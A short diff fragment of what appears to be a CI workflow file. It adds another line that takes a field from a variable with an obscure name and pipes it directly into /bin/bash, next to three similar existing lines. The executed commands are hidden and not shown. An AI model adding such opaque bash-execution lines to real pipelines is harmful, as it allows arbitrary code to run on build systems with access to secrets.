@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
           echo $i7480 | jq -r .gciu1 | /bin/bash
           printf '%s' "$yce4" | jq -r .km2 | /bin/bash
+          echo $vu22 | jq -r .bvb7 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
